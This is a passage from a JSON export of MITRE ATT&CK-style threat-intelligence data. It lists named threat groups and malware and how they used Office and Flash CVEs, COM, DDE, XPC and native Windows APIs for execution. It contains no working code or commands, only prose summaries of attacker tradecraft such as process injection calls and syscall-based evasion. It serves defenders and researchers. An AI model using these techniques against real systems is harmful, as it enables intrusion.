"Dragonfly", "description": "Dragonfly has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used exploits to enable follow-on execution of frameworks such as Meterpreter."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa has exploited CVE-2018-0798 for execution."}, {"id": "G0100", "name": "Inception", "description": "Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has leveraged vulnerabilities in client applications such as CVE-2017-11882 in Microsoft Office to enable code execution in victim environments."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906)."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. "}, {"id": "S0578", "name": "SUPERNOVA", "description": "SUPERNOVA was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148)."}, {"id": "G0062", "name": "TA459", "description": "TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has exploited CVE-2018-0798 in Equation Editor."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem was installed through exploitation of CVE-2024-39717 in Versa Director servers."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has relied on CVE-2022-30190 (Follina) for execution during delivery."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution."}], "sub_techniques": []}, {"name": "Inter-Process Communication", "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.", "detailed_description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes. Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution.", "id": "T1559", "examples": [{"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to create a pipe to enable inter-process communication."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can connect to the IPC$ share on remote machines."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can retrieve output from arbitrary processes and shell commands via a pipe."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can use pipes to redirect the standard input and the standard output."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP can listen over the Unix domain socket located at /data/runtime/cockpit/wd.fd."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin contains an embedded custom Tor network client that communicates with the primary payload via shared process memory."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can pipe command output to a targeted process."}, {"id": "S1078", "name": "RotaJakiro", "description": "When executing with non-root permissions, RotaJakiro uses the the shmget API to create shared memory between other known RotaJakiro processes. This allows processes to communicate with each other and share their PID."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has the ability to move data between its kernel and user mode components, generally using named pipes."}], "sub_techniques": [{"name": "Component Object Model", "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).", "detailed_description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.", "id": "T1559.001", "examples": [{"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use a COM object to execute queries to gather system information."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has used the WshShortcut COM object to create a .lnk shortcut file in the Windows startup folder."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use com objects identified with CLSID_ShellLink(IShellLink and IPersistFile) and WScript.Shell(RegWrite method) to enable persistence mechanisms."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group malware can insert malicious macros into documents using a Microsoft.Office.Interop object."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use the IARPUinstallerStringLauncher COM interface are part of its UAC bypass process."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can execute files on remote machines using DCOM."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use the ITaskService, ITaskDefinition and ITaskSettings COM interfaces to schedule a task."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can use the Windows Component Object Model (COM) to set scheduled tasks."}, {"id": "S1015", "name": "Milan", "description": "Milan can use a COM component to generate scheduled tasks."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can use the Internet Explorer (IE) COM interface to connect and receive commands from C2."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use the Windows COM API to schedule tasks and maintain persistence."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin creates an elevated COM object for CMLuaUtil and uses this to set a registry value that points to the malicious LNK file during execution."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can insert malicious shellcode into Excel.exe using a Microsoft.Office.Interop object."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot used COM to setup scheduled task for persistence."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif droppers have used COM objects to execute the malware's full executable payload."}]}, {"name": "Dynamic Data Exchange", "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.", "detailed_description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).", "id": "T1559.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used Windows DDE for execution of commands and a malicious VBS."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has sent malicious Word OLE compound documents to victims."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 spear phishing campaigns have included malicious Word documents with DDE execution."}, {"id": "G0084", "name": "Gallmaker", "description": "Gallmaker attempted to exploit Microsoft\u2019s DDE protocol in order to gain access to victim machines and for execution."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT has been delivered via Word documents using DDE for execution."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has used an OLE object that uses Equation Editor to drop the embedded shellcode."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy uses the Dynamic Data Exchange (DDE) protocol to download remote payloads."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents. "}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that can execute PowerShell scripts via DDE."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, threat actors sent malicious Word OLE documents to victims."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork leveraged the DDE protocol to deliver their malware."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT was delivered with documents using DDE to execute malicious code."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can use DDE to execute additional payloads on compromised hosts."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has been delivered using OLE objects in malicious documents."}, {"id": "S0148", "name": "RTM", "description": "RTM can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer."}, {"id": "G0092", "name": "TA505", "description": "TA505 has leveraged malicious Word documents that abused DDE."}, {"id": "S0476", "name": "Valak", "description": "Valak can execute tasks via OLE."}]}, {"name": "XPC Services", "description": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high level NSXPCConnection API in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.", "detailed_description": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high level NSXPCConnection API in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct Exploitation for Privilege Escalation.", "id": "T1559.003", "examples": []}]}, {"name": "Native API", "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.", "detailed_description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.", "id": "T1106", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL is capable of starting a process using CreateProcess."}, {"id": "S1129", "name": "Akira", "description": "Akira executes native Windows functions such as GetFileAttributesW and GetSystemInfo."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has used a variety of Windows API calls, including GetComputerNameA, GetUserNameA, and CreateProcessA."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to use multiple dynamically resolved API calls."}, {"id": "G0067", "name": "APT37", "description": "APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used the Windows API to execute code within a victim's system."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to launch files using ShellExecute."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT has the ability to use OS APIs including CheckRemoteDebuggerPresent."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher has used CreateProcessW API for execution."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has used the Windows Crypto API to generate an AES key."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has used a variety of Windows API calls, including NtCurrentPeb and GetLogicalDrives."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig can leverage API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has used various Windows API calls."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can utilize Native API functions such as, ToolHelp32 and Rt1AdjustPrivilege to enable SeDebugPrivilege on a compromised machine."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has used the ShellExecuteW() function call."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA()."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can use various APIs to allocate memory and facilitate code execution/injection."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to use the CreatePipe API to add a sub-process for execution via cmd."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used the Windows API to communicate with the Service Control Manager to execute a thread."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has used dynamic API resolution to avoid identifiable strings within the binary, including RegEnumKeyW."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta has the ability to use native APIs for numerous functions including discovery and defense evasion."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used built-in API functions."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can use .NET API calls in the SharpHound ingestor component to pull Active Directory data."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon has used Windows API calls to obtain information about the compromised host."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can call multiple Windows APIs for execution, to share memory, and defense evasion."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to use the WinExec API to execute malware on a compromised host."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use multiple Native APIs."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper has the ability to dynamically resolve and use APIs, including SeTakeOwnershipPrivilege."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories."}, {"id": "S0631", "name": "Chaes", "description": "Chaes used the CreateFileW() API function with read permissions to access downloaded payloads."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used direct Windows system calls by leveraging Dumpert."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use Windows APIs including LoadLibrary and GetProcAddress."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can use Windows API including WinExec for execution."}, {"id": "S0611", "name": "Clop", "description": "Clop has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc()."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike's Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe"}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT can load a PE file from memory or the file system and execute it with CreateProcessW."}, {"id": "S0575", "name": "Conti", "description": "Conti has used API calls during execution."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks has used a number of API calls, including VirtualAlloc, VirtualFree, LoadLibraryA, GetProcAddress, and ExitProcess."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can use various Linux API functions including those for execution and discovery."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses the native Windows API CallWindowProc() to decode and launch encoded shellcode payloads during execution. DarkGate can call kernel mode functions directly to hide the use of process hollowing methods during execution."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can use a variety of API calls for persistence and defense evasion."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has used various Windows API functions, including DeviceIoControl, as part of its encryption process."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can execute the GetComputerNameA and GetComputerNameExA WinAPI functions."}, {"id": "S0354", "name": "Denis", "description": "Denis used the IsDebuggerPresent, OutputDebugString, and SetLastError APIs to avoid debugging. Denis used GetProcAddress and LoadLibrary to dynamically resolve APIs. Denis also used the Wow64SetThreadContext API as part of a process hollowing process."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has used several API calls like GetLogicalDriveStrings, SleepEx, SystemParametersInfoAPI, CryptEncrypt, and others to execute parts of its attack."}, {"id": "S0695", "name": "Donut", "description": "Donut code modules use various API functions to load and inject code."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use various API calls to see if it is running in a sandbox."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has used the OutputDebugStringW function to avoid malware analysis as part of its anti-debugging technique."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used the Windows API to make detection more difficult."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used CreateProcess to create a new process to run its executable and WNetEnumResourceW to enumerate non-hidden shares."}, {"id": "S0363", "name": "Empire", "description": "Empire contains a variety of enumeration modules that have an option to use API calls to carry out tasks."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has a function to call the OpenClipboard wrapper."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can call ShellExecuteW to open the default browser on the URL localhost."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can use Native API to enable obfuscation including GetLastError and GetTickCount."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader can use API functions to load the FoggyWeb backdoor into the same Application Domain within which the legitimate AD FS managed code is executed."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use Native API for defense evasion, discovery, and collection."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group malware has used CreateProcess to launch additional malicious components."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to use various Windows API functions to perform tasks."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has used the InterlockedExchange, SeShutdownPrivilege, and ExitWindowsEx Windows API functions."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy can execute remote commands in the Windows command shell using the WinExec() API."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to  enumerate the infected system's user name via GetUserNameW."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can execute through the WinExec API."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can use Native API including GetProcAddress and ShellExecuteW."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader can use a number of different APIs for discovery and execution."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can connect to remote shares using WNetAddConnection2W."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa has called various native OS APIs."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has called ZwWriteVirtualMemory, ZwProtectVirtualMemory, ZwQueueApcThread, and NtResumeThread to inject itself into a remote process."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader imports native Windows APIs such as GetConsoleWindow and ShowWindow."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has leveraged CreateProcessW() call to execute the debugger."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can use the API DeviceIoControl to resize the allocated space for and cause the deletion of volume shadow copy snapshots."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT uses the API call ShellExecuteW for execution."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use winapiexec tool for indirect execution of  ShellExecuteW and CreateProcessA."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can use the ShowWindow API to avoid detection."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has called the Windows API to retrieve the hard disk handle and shut down the machine."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS can use the LoadResource and CreateProcessW APIs for execution."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has hardcoded API calls within its functions to use on the victim's machine."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has used multiple Windows API post exploitation including GetAdaptersInfo, CreateToolhelp32Snapshot, and CreateProcessW."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server. Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron is capable of starting a process using CreateProcess."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can use various API calls."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has used various Windows API functions on a victim's machine."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has used macOS API functions to perform tasks."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use a variety of API calls."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can run the ShellExecuteW API via the Windows Command Shell."}, {"id": "S0449", "name": "Maze", "description": "Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others."}, {"id": "S0576", "name": "MegaCortex", "description": "After escalating privileges, MegaCortex calls TerminateProcess(), CreateRemoteThread, and other Win32 APIs."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can execute an operator-provided Windows command by leveraging functions such as WinExec, WriteFile, and ReadFile."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used native WINAPI calls."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use WinAPI to remove a victim machine from an Active Directory domain."}, {"id": "S1015", "name": "Milan", "description": "Milan can use the API DnsQuery_A for DNS resolution."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has used Windows API calls, including NetUserAdd and NetUserDel."}, {"id": "S0083", "name": "Misdat", "description": "Misdat has used Windows APIs, including ExitWindowsEx and GetKeyboardType."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has used a variety of Windows API calls, including ShellExecute and WriteProcessMemory."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae has the ability to use CreateProcess to execute a process."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can use Windows API functions to inject the ransomware DLL."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use Native API including CreateProcess GetProcessById, and WriteProcessMemory."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use multiple native APIs including GetKeyState, GetForegroundWindow, GetWindowThreadProcessId, and GetKeyboardLayout."}, {"id": "S1100", "name": "Ninja", "description": "The Ninja loader can call Windows APIs for discovery, process injection, and payload decryption."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has used the ShellExecute() function within a script."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used Windows API 